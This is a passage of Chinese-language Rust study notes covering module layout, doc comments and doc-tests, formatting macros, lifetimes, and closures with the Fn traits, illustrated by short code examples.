\u8868\u793a\u5728\u5f53\u524d\u5305\u5185\u53ef\u89c1 pub ( self ) \u8868\u793a\u5728\u5f53\u524d\u6a21\u5757\u4e2d\u53ef\u89c1 pub ( super ) \u8868\u793a\u5728\u7236\u6a21\u5757\u4e2d\u53ef\u89c1 pub ( in < path > ) \u8868\u793a\u5728 <path> \u4ee3\u8868\u7684\u6a21\u5757\u4e2d\u53ef\u89c1 \u4e09\u79cd\u6a21\u5757\u76ee\u5f55\u7ec4\u7ec7\u65b9\u5f0f \u00b6 Rust 2015 . \u251c\u2500\u2500 lib.rs \u2514\u2500\u2500 foo/ \u251c\u2500\u2500 mod.rs \u2514\u2500\u2500 bar.rs lib.rs \u4e2d mod foo; \u4f1a\u5f15\u5165 foo/mod.rs \u4e2d\u5185\u5bb9 \u9700\u8981\u5728 foo/mod.rs \u4e2d\u7ee7\u7eed\u4e3a bar.rs \u521b\u5efa\u540c\u540d mod Rust 2018 . \u251c\u2500\u2500 lib.rs \u251c\u2500\u2500 foo.rs \u2514\u2500\u2500 foo/ \u2514\u2500\u2500 bar.rs lib.rs \u4e2d mod foo; \u4f1a\u5f15\u5165 foo.rs \u5728 foo.rs \u4e2d mod bar; \u4e0e 2015 \u7684\u6a21\u5f0f\u76f8\u6bd4\u5c31\u76f8\u5f53\u4e8e\u5c06 mod.rs \u63d0\u5230\u6587\u4ef6\u5939\u5916\u7684\u540c\u540d\u6587\u4ef6\u4e86 \u4f7f\u7528 #[path = ...] \u521b\u5efa\u6a21\u5757\uff08\u614e\u7528\uff09 . \u251c\u2500\u2500 lib.rs \u2514\u2500\u2500 pkg/ // \u4efb\u610f \u251c\u2500\u2500 foo.rs \u2514\u2500\u2500 bar.rs lib.rs \u4e2d\u5728 mod foo; \u524d\u6307\u5b9a\u8def\u5f84\uff1a #[path = \"./pkg/foo.rs\" ] pub mod foo ; #[path = \"./pkg/bar.rs\" ] pub mod bar ; \u6ce8\u91ca\u4e0e\u6587\u6863 \u00b6 Rust \u4e2d\u6ce8\u91ca\u5206\u4e3a\u4e24\u7c7b\uff1a \u4ee3\u7801\u6ce8\u91ca\uff1a\u8bf4\u660e\u67d0\u4e00\u6bb5\u4ee3\u7801\u7684\u4f5c\u7528\uff08// \u884c\u6ce8\u91ca\u548c /* ... */ \u5757\u6ce8\u91ca\uff09 \u6587\u6863\u6ce8\u91ca\uff1a\u4f7f\u7528 markdown \u8bed\u6cd5\uff0c\u63cf\u8ff0\u9879\u76ee\u3001\u4ecb\u7ecd\u529f\u80fd\u3001\u751f\u6210\u6587\u6863 \u5305\u548c\u6a21\u5757\u6ce8\u91ca\uff1a\u8bf4\u660e\u5f53\u524d\u5305\u548c\u6a21\u5757\u7684\u529f\u80fd \u6587\u6863\u6ce8\u91ca \u00b6 \u6587\u6863\u884c\u6ce8\u91ca /// \u4e0e\u6587\u6863\u5757\u6ce8\u91ca /** ... */ \u6587\u6863\u6ce8\u91ca\u9700\u8981\u4f4d\u4e8e\u5e93\u7c7b\u578b\u7684 crate \u4e2d \u53ef\u4ee5\u4f7f\u7528 markdown \u8bed\u6cd5\uff0c\u4ee5\u53ca\u4ee3\u7801\u5757\u9ad8\u4eae\u663e\u793a \u5199\u5728\u88ab\u6ce8\u91ca\u7c7b\u578b\u4e0a\u65b9 \u88ab\u6ce8\u91ca\u7684\u5bf9\u8c61\u9700\u8981 pub \u5bf9\u5916\u53ef\u89c1 \u6587\u6863\u6ce8\u91ca\u4e2d\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u591a\u4e2a\u4e00\u7ea7\u6807\u9898\uff0c\u5e38\u7528\u7684\u6709 # Examples # Panics\uff1a\u63cf\u8ff0\u51fd\u6570\u53ef\u80fd\u4f1a\u51fa\u73b0\u7684 panic \u60c5\u51b5 # Errors\uff1a\u63cf\u8ff0\u53ef\u80fd\u4f1a\u51fa\u73b0\u7684\u9519\u8bef\u4ee5\u53ca\u89e6\u53d1\u60c5\u51b5 # Safety\uff1aunsafe \u4ee3\u7801\u9700\u8981\u6ce8\u610f\u7684\u4f7f\u7528\u6761\u4ef6 \u5305/\u6a21\u5757\u7ea7\u522b\u884c\u6ce8\u91ca //! \u4e0e\u5305/\u6a21\u5757\u7ea7\u522b\u5757\u6ce8\u91ca /*! ... */ \u5199\u5728 crate root \u7684\u6700\u4e0a\u65b9 \u4f7f\u7528 cargo doc \u6784\u5efa\u6587\u6863\uff0c\u751f\u6210\u5728 target/doc \u76ee\u5f55\u4e0b \u4f7f\u7528 cargo doc --open \u6784\u5efa\u5e76\u6253\u5f00 \u6587\u6863\u6d4b\u8bd5 \u6587\u6863\u6ce8\u91ca\u4e2d\u7684\u4ee3\u7801\u5757\u53ef\u4ee5\u7528\u4f5c\u6d4b\u8bd5\uff0c\u76f4\u63a5\u5199 assert \u7b49\u5b8f\u5c31\u53ef\u4ee5 \u4f7f\u7528 cargo test \u4f1a\u8fdb\u884c\u6d4b\u8bd5\uff0c\u5e76\u663e\u793a \"Doc-tests ...\" \u9884\u671f\u4f1a\u9020\u6210 panic \u7b49\u4ee3\u7801\u5757\u9700\u8981\u5728\u4ee3\u7801\u5757\u8bed\u8a00\u540e\u52a0\u4e0a should_panic\uff1a /// # Panics /// /// ```rust,should_panic /// ... /// ``` \u4ec5\u6d4b\u8bd5\uff0c\u4e0d\u663e\u793a\u5728\u6587\u6863\u4e2d\u7684\u884c\u5f00\u5934\u52a0 # \u5c31\u53ef\u4ee5\uff1a /// ``` /// # fn try_main() -> Result<(), String> { /// let res = ...::func()?; /// # Ok(()) /// # } /// # fn main() { /// # try_main().unwrap(); /// # } \u5982\u4e0a\u8ff0\u4f8b\u5b50\uff0c\u6700\u7ec8\u5728\u6587\u6863\u4e2d\u53ea\u4f1a\u663e\u793a let \u90a3\u4e00\u884c\uff0c\u4f46\u5728\u8fdb\u884c doc-test \u65f6\u5168\u90e8\u4ee3\u7801\u90fd\u4f1a\u8fd0\u884c \u4ee3\u7801\u8df3\u8f6c\uff08\u81ea\u52a8\u94fe\u63a5\uff09 \u6587\u6863\u4e2d\u5199 [`Option`] \u4f1a\u5728\u6587\u6863\u4e2d\u521b\u5efa\u4e00\u4e2a\u6307\u5411\u6807\u51c6\u5e93\u4e2d Option \u7c7b\u578b\u7684\u94fe\u63a5 \u4e5f\u53ef\u4ee5\u6307\u5b9a\u5177\u4f53\u7684\u8def\u5f84\u6765\u521b\u5efa\u6307\u5411\u81ea\u5df1\u4ee3\u7801\u6216\u5176\u5b83\u5e93\u4e2d\u6307\u5b9a\u9879\u7684\u94fe\u63a5 \u540c\u540d\u9879\u53ef\u4ee5\u6807\u793a\u7c7b\u578b\uff1a /// \u8df3\u8f6c\u5230\u7ed3\u6784\u4f53 [`Foo`](struct@Foo) pub struct Bar ; /// \u8df3\u8f6c\u5230\u540c\u540d\u51fd\u6570 [`Foo`](fn@Foo) pub struct Foo {} /// \u8df3\u8f6c\u5230\u540c\u540d\u5b8f [`foo!`] pub fn Foo () {} #[macro_export] macro_rules! foo { () => {} } \u6587\u6863\u641c\u7d22\u522b\u540d #[doc(alias = \"x\" )] #[doc(alias = \"big\" )] pub struct BigX ; #[doc(alias( \"y\" , \"big\" ))] pub struct BigY ; \u5982\u4e0a\u4ee3\u7801\uff0c\u5728\u6587\u6863\u4e2d\u641c\u7d22\u7684\u65f6\u5019\uff0c\u641c\u7d22 x \u5c31\u4f1a\u547d\u4e2d BigX \u683c\u5f0f\u5316\u8f93\u51fa \u00b6 Rust \u7684\u683c\u5f0f\u5316\u5c31\u6bd4\u8f83\u7c7b\u4f3c\u4e8e python \u7684 format \u4e86 \u683c\u5f0f\u5316\u5b8f print!\uff1a\u683c\u5f0f\u5316\u6587\u672c\u5230\u6807\u51c6\u8f93\u51fa\uff0c\u4e0d\u6362\u884c println!\uff1a\u683c\u5f0f\u5316\u6587\u672c\u5230\u6807\u51c6\u8f93\u51fa\uff0c\u6362\u884c format!\uff1a\u683c\u5f0f\u5316\u6587\u672c\uff0c\u8fd4\u56de String eprint! \u4e0e eprintln!\uff1a\u683c\u5f0f\u5316\u5230\u6807\u51c6\u9519\u8bef\u8f93\u51fa \u5360\u4f4d\u7b26 {} \u9002\u7528\u4e8e\u5b9e\u73b0\u4e86 std::fmt::Display trait \u7684\u7c7b\u578b\uff0c\u7528\u4e8e\u5c55\u793a\u7ed9\u7528\u6237 {:?} \u9002\u7528\u4e8e\u5b9e\u73b0\u4e86 std::fmt::Debug trait \u7684\u7c7b\u578b\uff0c\u7528\u4e8e\u8c03\u8bd5 {:#?} \u540c\u4e0a\uff0c\u4e0d\u8fc7\u663e\u793a\u66f4\u4f18\u7f8e\uff08\u81ea\u52a8\u6362\u884c\u4e00\u7c7b\uff09 \u5b9e\u73b0 Display trait use std :: fmt ; impl fmt :: Display for .. . { fn fmt ( & self , f : & mut fmt :: Formatter ) -> fmt :: Result { write! ( f , \"...{}...\" , .. .) } } \u53ea\u80fd\u4e3a\u5f53\u524d\u4f5c\u7528\u57df\u4e2d\u7684\u7c7b\u578b\u5b9e\u73b0 Display trait \u4e3a\u5916\u90e8\u7c7b\u578b\u5b9e\u73b0 Display \u53ef\u4ee5\u4f7f\u7528 newtype \u6a21\u5f0f \u4f4d\u7f6e\u53c2\u6570 fn main () { println! ( \"{}{}\" , 1 , 2 ); // =>\"12\" println! ( \"{1}{0}\" , 1 , 2 ); // =>\"21\" // => Alice, this is Bob. Bob, this is Alice println! ( \"{0}, this is {1}. {1}, this is {0}\" , \"Alice\" , \"Bob\" ); println! ( \"{1}{}{0}{}\" , 1 , 2 ); // => 2112 } \u5bf9\u4e8e {:?} \u6216 {:#?}\uff0c\u5c06\u4f4d\u7f6e\u53c2\u6570\u52a0\u5728\u5192\u53f7\u524d\u5c31\u53ef\u4ee5 \u5177\u540d\u53c2\u6570 fn main () { println! ( \"{argument}\" , argument = \"test\" ); // => \"test\" println! ( \"{name} {}\" , 1 , name = 2 ); // => \"2 1\" println! ( \"{a} {c} {b}\" , a = \"a\" , b = 'b' , c = 3 ); // => \"a 3 b\" } \u5e26\u540d\u79f0\u7684\u53c2\u6570\u53ea\u80fd\u653e\u5728\u4e0d\u5e26\u540d\u79f0\u7684\u540e\u9762 \u683c\u5f0f\u5316\u53c2\u6570 \u5bbd\u5ea6\u586b\u5145 \u5b57\u7b26\u4e32 //----------------------------------- // \u4ee5\u4e0b\u5168\u90e8\u8f93\u51fa \"Hello x !\" // \u4e3a\"x\"\u540e\u9762\u586b\u5145\u7a7a\u683c\uff0c\u8865\u9f50\u5bbd\u5ea65 println! ( \"Hello {:5}!\" , \"x\" ); // \u4f7f\u7528\u53c2\u65705\u6765\u6307\u5b9a\u5bbd\u5ea6 println! ( \"Hello {:1$}!\" , \"x\" , 5 ); // \u4f7f\u7528x\u4f5c\u4e3a\u5360\u4f4d\u7b26\u8f93\u51fa\u5185\u5bb9\uff0c\u540c\u65f6\u4f7f\u75285\u4f5c\u4e3a\u5bbd\u5ea6 println! ( \"Hello {1:0$}!\" , 5 , \"x\" ); // \u4f7f\u7528\u6709\u540d\u79f0\u7684\u53c2\u6570\u4f5c\u4e3a\u5bbd\u5ea6 println! ( \"Hello {:width$}!\" , \"x\" , width = 5 ); //----------------------------------- // \u4f7f\u7528\u53c2\u65705\u4e3a\u53c2\u6570x\u6307\u5b9a\u5bbd\u5ea6\uff0c\u540c\u65f6\u5728\u7ed3\u5c3e\u8f93\u51fa\u53c2\u65705 => Hello x !5 println! ( \"Hello {:1$}!{}\" , \"x\" , 5 ); \u6570\u5b57 // \u5bbd\u5ea6\u662f5 => Hello 5! println! ( \"Hello {:5}!\" , 5 ); // \u663e\u5f0f\u7684\u8f93\u51fa\u6b63\u53f7 => Hello +5! println! ( \"Hello {:+}!\" , 5 ); // \u5bbd\u5ea65\uff0c\u4f7f\u75280\u8fdb\u884c\u586b\u5145 => Hello 00005! println! ( \"Hello {:05}!\" , 5 ); // \u8d1f\u53f7\u4e5f\u8981\u5360\u7528\u4e00\u4f4d\u5bbd\u5ea6 => Hello -0005! println! ( \"Hello {:05}!\" , - 5 ); \u5bf9\u9f50 // \u4ee5\u4e0b\u5168\u90e8\u90fd\u4f1a\u8865\u9f505\u4e2a\u5b57\u7b26\u7684\u957f\u5ea6 // \u5de6\u5bf9\u9f50 => Hello x ! println! ( \"Hello {:<5}!\" , \"x\" ); // \u53f3\u5bf9\u9f50 => Hello x! println! ( \"Hello {:>5}!\" , \"x\" ); // \u5c45\u4e2d\u5bf9\u9f50 => Hello x ! println! ( \"Hello {:^5}!\" , \"x\" ); // \u5bf9\u9f50\u5e76\u4f7f\u7528\u6307\u5b9a\u7b26\u53f7\u586b\u5145 => Hello x&&&&! // \u6307\u5b9a\u7b26\u53f7\u586b\u5145\u7684\u524d\u63d0\u6761\u4ef6\u662f\u5fc5\u987b\u6709\u5bf9\u9f50\u5b57\u7b26 println! ( \"Hello {:&<5}!\" , \"x\" ); \u7cbe\u5ea6 let v = 3.1415926 ; // \u4fdd\u7559\u5c0f\u6570\u70b9\u540e\u4e24\u4f4d => 3.14 println! ( \"{:.2}\" , v ); // \u5e26\u7b26\u53f7\u4fdd\u7559\u5c0f\u6570\u70b9\u540e\u4e24\u4f4d => +3.14 println! ( \"{:+.2}\" , v ); // \u4e0d\u5e26\u5c0f\u6570 => 3 println! ( \"{:.0}\" , v ); // \u901a\u8fc7\u53c2\u6570\u6765\u8bbe\u5b9a\u7cbe\u5ea6 => 3.1416\uff0c\u76f8\u5f53\u4e8e{:.4} println! ( \"{:.1$}\" , v , 4 ); let s = \"abcded\" ; // \u4fdd\u7559\u5b57\u7b26\u4e32\u524d\u4e09\u4e2a\u5b57\u7b26 => abc println! ( \"{:.3}\" , s ); // {:.*}\u63a5\u6536\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u7cbe\u5ea6\uff0c\u7b2c\u4e8c\u4e2a\u662f\u88ab\u683c\u5f0f\u5316\u7684\u503c => Hello abc! println! ( \"Hello {:.*}!\" , 3 , \"abcdefg\" ); \u8fdb\u5236 // \u4e8c\u8fdb\u5236 => 0b11011! println! ( \"{:#b}!\" , 27 ); // \u516b\u8fdb\u5236 => 0o33! println! ( \"{:#o}!\" , 27 ); // \u5341\u8fdb\u5236 => 27! println! ( \"{}!\" , 27 ); // \u5c0f\u5199\u5341\u516d\u8fdb\u5236 => 0x1b! println! ( \"{:#x}!\" , 27 ); // \u5927\u5199\u5341\u516d\u8fdb\u5236 => 0x1B! println! ( \"{:#X}!\" , 27 ); // \u4e0d\u5e26\u524d\u7f00\u7684\u5341\u516d\u8fdb\u5236 => 1b! println! ( \"{:x}!\" , 27 ); // \u4f7f\u75280\u586b\u5145\u4e8c\u8fdb\u5236\uff0c\u5bbd\u5ea6\u4e3a10 => 0b00011011! println! ( \"{:#010b}!\" , 27 ); \u6307\u6570 println! ( \"{:2e}\" , 1000000000 ); // => 1e9 println! ( \"{:2E}\" , 1000000000 ); // => 1E9 \u6307\u9488\u5730\u5740 let v = vec! [ 1 , 2 , 3 ]; println! ( \"{:p}\" , v . as_ptr ()) // => 0x600002324050 \u8f93\u51fa { \u6216 } \u8981\u5199\u4e24\u6b21\u8fdb\u884c\u8f6c\u4e49 1.58 \u4e2d\u65b0\u589e\u6355\u83b7\u73af\u5883\u503c \u7c7b\u4f3c python \u4e2d\u7684 f-string\uff0c\u4e0d\u8fc7\u4e0d\u9700\u8981\u7279\u6b8a\u6807\u6ce8 \u6355\u83b7\u53d8\u91cf\u53ef\u4ee5\u66ff\u6362\u5728\u4efb\u4f55\u4f4d\u7f6e let ( width , precision ) = get_format (); for ( name , score ) in get_scores () { println! ( \"{name}: {score:width$.precision$}\" ); } panic! \u5728 2021 \u7248\u672c\u4e0b\u624d\u53ef\u4ee5\u8fd9\u6837\u4f7f\u7528 \u751f\u547d\u5468\u671f \u00b6 \u5b58\u5728\u591a\u4e2a\u5f15\u7528\u65f6\uff0c\u7f16\u8bd1\u5668\u6709\u65f6\u4f1a\u65e0\u6cd5\u81ea\u52a8\u63a8\u5bfc\u751f\u547d\u5468\u671f\uff0c\u9700\u8981\u624b\u52a8\u6807\u6ce8 \u751f\u547d\u5468\u671f\u662f\u4e3a\u7f16\u8bd1\u5668\u800c\u6807\u6ce8\uff0c\u5e76\u4e0d\u4f1a\u6539\u53d8\u4efb\u4f55\u5f15\u7528\u7684\u5b9e\u9645\u4f5c\u7528\u57df \u751f\u547d\u5468\u671f\u4ee5 ' \u5f00\u5934\uff0c\u540d\u79f0\u5f80\u5f80\u662f\u5355\u72ec\u7684\u5c0f\u5199\u5b57\u6bcd\uff08\u5982 ' a \uff09 & i32 // i32 \u7c7b\u578b\u7684\u5f15\u7528 &' a i32 // \u5e26\u6709\u663e\u793a\u751f\u547d\u5468\u671f 'a \u7684 i32 \u5f15\u7528 &' a mut i32 // \u5e26\u6709\u663e\u793a\u751f\u547d\u5468\u671f 'a \u7684 i32 \u53ef\u53d8\u5f15\u7528 \u51fd\u6570\u7b7e\u540d\u4e2d\u4f7f\u7528\u751f\u547d\u5468\u671f\u9700\u8981\u5148\u50cf\u6cdb\u578b\u4e00\u6837\u58f0\u660e fn func <' a > ( x : & ' a str , y : & ' a str ) -> & ' a str {} \u8868\u793a\u4e24\u4e2a\u53c2\u6570\u4ee5\u53ca\u8fd4\u56de\u5f15\u7528\u81f3\u5c11\u548c 'a \u6d3b\u5f97\u4e00\u6837\u4e45 \u4e24\u4e2a\u53c2\u6570\u7684\u771f\u5b9e\u751f\u547d\u5468\u671f\u53ef\u80fd\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u53ea\u9700\u8981\u4e0d\u5c0f\u4e8e 'a \u5c31\u53ef\u4ee5 \u8c03\u7528\u7684\u65f6\u5019\u4e0d\u5fc5\u6807\u6ce8\u751f\u547d\u5468\u671f \u751f\u547d\u5468\u671f\u8bed\u6cd5\u7528\u6765\u5c06\u51fd\u6570\u7684\u591a\u4e2a\u5f15\u7528\u53c2\u6570\u548c\u8fd4\u56de\u503c\u7684\u4f5c\u7528\u57df\u5173\u8054\u5230\u4e00\u8d77\uff0c\u907f\u514d\u4e86\u60ac\u5782\u5f15\u7528 \u8fd4\u56de\u503c\u662f\u5f15\u7528\u65f6\uff0c\u5176\u751f\u547d\u5468\u671f\u53ea\u80fd\u6765\u81ea\u53c2\u6570\uff0c\u6765\u81ea\u51fd\u6570\u4f53\u5185\u90e8\u7684\u8bdd\u5c31\u662f\u60ac\u5782\u5f15\u7528 \u7ed3\u6784\u4f53\u4e2d\u751f\u547d\u5468\u671f \u7ed3\u6784\u4f53\u4e2d\u4f7f\u7528\u751f\u547d\u5468\u671f\u53ef\u4ee5\u4fdd\u8bc1\u5185\u90e8\u5f15\u7528\u7c7b\u578b\u7684\u53c2\u6570\u6d3b\u5f97\u6bd4\u7ed3\u6784\u4f53\u672c\u8eab\u957f struct MyStruct <' a > { string : & ' a str , } \u5982\u4e0b\u4f8b\u5373\u662f\u7ed3\u6784\u4f53\u83b7\u5f97\u6bd4\u5185\u90e8\u53c2\u6570\u957f\uff0c\u4f1a\u62a5\u9519\uff1a let i ; { let string = String :: from ( \"test\" ); i = MyStruct { string : string . as_str () }; } println! ( \"{:?}\" , i ); \u751f\u547d\u5468\u671f\u6d88\u9664 \u6709\u65f6\u7f16\u8bd1\u5668\u53ef\u4ee5\u81ea\u52a8\u63a8\u6d4b\u751f\u547d\u5468\u671f\uff0c\u4e0d\u9700\u8981\u663e\u793a\u6807\u6ce8 \u6d88\u9664\u89c4\u5219\uff08\u63a8\u6d4b\u89c4\u5219\uff09 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6bcf\u4e00\u4e2a\u5f15\u7528\u53c2\u6570\u90fd\u4f1a\u83b7\u5f97\u4e00\u4e2a\u72ec\u81ea\u7684\u751f\u547d\u5468\u671f \u5982\u679c\u53ea\u6709\u4e00\u4e2a\u8f93\u5165\u751f\u547d\u5468\u671f\uff08\u53c2\u6570\u7684\u751f\u547d\u5468\u671f\uff0c\u5373\u53ea\u6709\u4e00\u4e2a\u5f15\u7528\u7c7b\u578b\u53c2\u6570\uff09\uff0c\u5219\u8be5\u751f\u547d\u5468\u671f\u4f1a\u88ab\u8d4b\u7ed9\u6240\u6709\u8f93\u51fa\u751f\u547d\u5468\u671f \u5982\u679c\u5b58\u5728\u591a\u4e2a\u8f93\u5165\u751f\u547d\u5468\u671f\uff0c\u4f46\u5176\u4e2d\u4e00\u4e2a\u662f & self \u6216 & mut self \uff0c\u5219 self \u7684\u751f\u547d\u5468\u671f\u4f1a\u88ab\u8d4b\u7ed9\u6240\u6709\u8f93\u51fa\u751f\u547d\u5468\u671f \u95ed\u5305\u4e0d\u4f1a\u9075\u5faa\u8fd9\u4e2a\u89c4\u5219 impl \u5757\u751f\u547d\u5468\u671f\u6d88\u9664\uff08\u5373\u7701\u7565\uff09 impl \u5757\u4e2d\u6ca1\u6709\u7528\u5230\u7684\u751f\u547d\u5468\u671f\u53ef\u4ee5\u4f7f\u7528 '_ \u6765\u8fdb\u884c\u7701\u7565\uff1a impl <' a > .. . for .. . <' a > {} impl .. . for .. . <' _ > {} \u4e3a\u5e26\u6709\u751f\u547d\u5468\u671f\u7684\u7ed3\u6784\u4f53\u5b9e\u73b0\u65b9\u6cd5 \u9700\u8981\u50cf\u6cdb\u578b\u4e00\u6837\u4e3a impl \u548c\u7ed3\u6784\u4f53\u540d\u90fd\u6807\u6ce8\u4e0a\u751f\u547d\u5468\u671f impl <' a > MyStruct <' a > { fn method ( & self , another_str : & str ) -> & str { println! ( \"{}\" , another_str ); self . string } } \u4e0a\u9762\u4f8b\u5b50\u4e2d\u53ef\u4ee5\u4e0d\u4e3a method \u6807\u6ce8\u751f\u547d\u5468\u671f\uff0c\u56e0\u4e3a\u6839\u636e\u4e0a\u9762\u6d88\u9664\u89c4\u5219\u7684\u7b2c\u4e00\u548c\u7b2c\u4e09\u6761\uff0c\u4f1a\u81ea\u52a8\u63a8\u6d4b\u4e3a\u8fd4\u56de\u503c\u6807\u4e0a\u548c & self \u4e00\u6837\u7684\u751f\u547d\u5468\u671f \u751f\u547d\u5468\u671f\u7ea6\u675f \u5982\u60f3\u8981\u4e3a\u4e0a\u9762 method \u7684\u8fd4\u56de\u503c\u8d4b\u4e0a\u548c another_str \u4e00\u6837\u7684\u751f\u547d\u5468\u671f\uff0c\u5219\u9700\u8981\u4fdd\u8bc1\u8fd9\u4e2a\u751f\u547d\u5468\u671f\u8981\u6bd4 self \u7684\u751f\u547d\u5468\u671f\u5c0f\uff0c\u4f7f\u7528 ' a : ' b \u8bed\u6cd5\u6765\u8868\u793a 'a \u4e00\u5b9a\u4e0d\u5c0f\u4e8e 'b impl <' a : ' b , ' b > MyStruct <' a > { fn method ( &' a self , another : & ' b str ) -> & ' b str { println! ( \"{}\" , another ); self . string } } \u6216\u8005\u4f7f\u7528 where \u6765\u5355\u72ec\u5bf9\u4e00\u4e2a\u65b9\u6cd5\u8fdb\u884c\u7ea6\u675f\uff1a impl <' a > MyStruct <' a > { fn method <' b > ( &' a self , another : & ' b str ) -> & ' b str where ' a : ' b { println! ( \"{}\" , another ); self . string } } T: 'a \u8868\u793a\u7c7b\u578b T \u5fc5\u987b\u83b7\u5f97\u6bd4 'a \u4e45\uff1a struct Ref <' a , T : ' a > { r : & ' a T } \u9759\u6001\u751f\u547d\u5468\u671f \u548c\u6574\u4e2a\u7a0b\u5e8f\u6d3b\u5f97\u4e00\u6837\u4e45\u7684\u5f15\u7528\u53ef\u4ee5\u4f7f\u7528 'static \u6765\u6807\u6ce8\uff08\u4f8b\u5982\u5b57\u7b26\u4e32\u5b57\u9762\u91cf\uff09 &'static \u4ec5\u9488\u5bf9\u5f15\u7528\uff0c\u800c\u4e0d\u662f\u6301\u6709\u8be5\u5f15\u7528\u7684\u53d8\u91cf \u53d6\u60a6\u7f16\u8bd1\u5668\u53ef\u4ee5\u4f7f\u7528 T: 'static\uff0c\u5373\u4f7f T \u4e0d\u662f static \u7684 fn static_bound < T : Display + ' static > ( t : & T ) { println! ( \"{}\" , t ); } fn main () { let s1 = \"String\" . to_string (); static_bound ( & s1 ); } NLL\uff08Non-Lexical Lifetime\uff09\u89c4\u5219 Rust 1.31 \u540e\u5f15\u7528\u7684\u751f\u547d\u5468\u671f\u4ece\u501f\u7528\u5904\u5f00\u59cb\u4e00\u76f4\u6301\u7eed\u5230 \u6700\u540e\u4e00\u6b21\u4f7f\u7528\u7684\u5730\u65b9 Reborrow \u518d\u501f\u7528 let mut p = Point { x : 0 , y : 0 }; let r = & mut p ; let rr : & Point = &* r ; println! ( \"{:?}\" , rr ); r . move_to ( 10 , 10 ) println! ( \"{:?}\" , r ); \u53ef\u53d8\u501f\u7528\u548c\u4e0d\u53ef\u53d8\u7684\u5b83\u7684\u518d\u501f\u7528\u53ef\u4ee5\u540c\u65f6\u5b58\u5728\uff0c\u4f46\u662f\u4e0d\u80fd\u5728\u518d\u501f\u7528\u7684\u751f\u547d\u5468\u671f\u5185\u4f7f\u7528\u53ef\u53d8\u501f\u7528\u3002\u4e5f\u5c31\u662f\u4e0a\u9762\u4f8b\u5b50\u4e2d\u5728 rr \u7684\u751f\u547d\u5468\u671f\u5185\u4e0d\u80fd\u4f7f\u7528 r\uff08rr \u7684\u751f\u547d\u5468\u671f\u7531\u4e8e NLL \u89c4\u5219\uff0c\u5230\u7b2c\u4e00\u4e2a println! \u7684\u65f6\u5019\u5c31\u5df2\u7ecf\u7ed3\u675f\u4e86\uff0c\u540e\u9762\u53ef\u4ee5\u7ee7\u7eed\u4f7f\u7528 r\uff09 \u95ed\u5305\u548c\u8fed\u4ee3\u5668 \u00b6 \u95ed\u5305 \u00b6 \u4e00\u79cd\u533f\u540d\u51fd\u6570\uff0c\u53ef\u4ee5\u8d4b\u503c\u7ed9\u53d8\u91cf\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9\u51fd\u6570\uff0c\u4f46\u53ef\u4ee5\u6355\u83b7\u8c03\u7528\u8005\u4f5c\u7528\u57df\u4e2d\u7684\u503c let x = 1 ; let sum = | y | x + y ; assert_eq! ( 3 , sum ( 2 )); \u95ed\u5305\u8bed\u6cd5\uff1a | para1 , para2 , .. . | { statement1 ; statement2 ; expression } | para1 , para2 , .. . | expression \u7c7b\u578b\u63a8\u5bfc \u95ed\u5305\u4e0d\u4f1a\u4f5c\u4e3a api \u5bf9\u5916\u63d0\u4f9b\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f9d\u9760\u7f16\u8bd1\u5668\u7684\u7c7b\u578b\u63a8\u5bfc\u80fd\u529b\uff0c\u65e0\u9700\u624b\u52a8\u6807\u6ce8 ```rust let sum = |x, y| x + y; let v = sum(1, 2) // \u7f16\u8bd1\u5668\u901a\u8fc7\u8fd9\u53e5\u63a8\u5bfc\u51fa\u7c7b\u578b ```` \u4f46\u5f53\u95ed\u5305\u53ea\u58f0\u660e\u6ca1\u6709\u4f7f\u7528\u65f6\uff0c\u7f16\u8bd1\u5668\u5e76\u4e0d\u80fd\u63a8\u5bfc\u51fa\u7c7b\u578b\uff0c\u9700\u8981\u624b\u52a8\u6807\u6ce8 \u5f53\u7f16\u8bd1\u5668\u63a8\u5bfc\u51fa\u4e00\u79cd\u7c7b\u578b\u4e4b\u540e\uff0c\u5c31\u4f1a\u4e00\u76f4\u4f7f\u7528\u8be5\u7c7b\u578b\uff0c\u800c\u4e0d\u80fd\u5c06\u95ed\u5305\u5f53\u4f5c\u6cdb\u578b\u4f7f\u7528 \u7ed3\u6784\u4f53\u4e2d\u5b58\u50a8\u95ed\u5305 struct Cacher < T , E > where T : Fn ( E ) -> E , E : Copy { query : T , value : Option < E > , } \u95ed\u5305\u7c7b\u578b\u4e00\u5b9a\u8981\u901a\u8fc7\u6cdb\u578b\u6765\u5b9a\u4e49\uff0c\u56e0\u4e3a\u4e0d\u540c\u5b9e\u73b0\u7684\u7c7b\u578b\u90fd\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u8981\u6c42\u4ec5\u4ec5\u662f\u5b9e\u73b0 Fn(E) -> E \u8fd9\u4e2a trait\uff0c\u5373\u8f93\u5165 E \u8fd4\u56de E \u4e09\u79cd Fn trait FnOnce\uff1a\u53ea\u80fd\u8fd0\u884c\u4e00\u6b21\uff08\u4f1a\u5e26\u8d70\u88ab\u6355\u83b7\u53d8\u91cf\u7684\u6240\u6709\u6743\uff09 \u5e26\u8d70\u6240\u6709\u6743\u7684\u4f8b\u5b50\uff1a let x = String :: from ( \"test\" ); let sum = | y | x + y ; println! ( \"{}\" , sum ( \"test\" )); println! ( \"{}\" , x ); // \u62a5\u9519\uff0c\u56e0\u4e3a\u6240\u6709\u6743\u8fdb\u5165\u4e86\u95ed\u5305\u4e2d \u4ec5\u5b9e\u73b0\u4e86 FnOnce \u7684\u95ed\u5305\u5728\u8c03\u7528\u65f6\u4f1a\u8f6c\u79fb\u6240\u6709\u6743\uff0c\u4e0d\u80fd\u8c03\u7528\u4e24\u6b21\uff1a fn fn_once < F > ( func : F ) where F : FnOnce ( usize ) -> bool { func ( 1 ); func ( 2 ); // \u62a5\u9519 } \u4f46\u662f\u7ed9 F \u52a0\u4e00\u4e2a Copy \u7684\u7ea6\u675f\u5219\u53ef\u4ee5\u8c03\u7528\u591a\u6b21 \u5728\u53c2\u6570\u5217\u8868\u524d\u52a0 move \u5173\u952e\u5b57\u5f3a\u5236\u95ed\u5305\u83b7\u53d6\u6355\u83b7\u53d8\u91cf\u7684\u6240\u6709\u6743\uff08\u805a\u7126\u4e8e\u5982\u4f55\u6355\u83b7\u53d8\u91cf\uff09 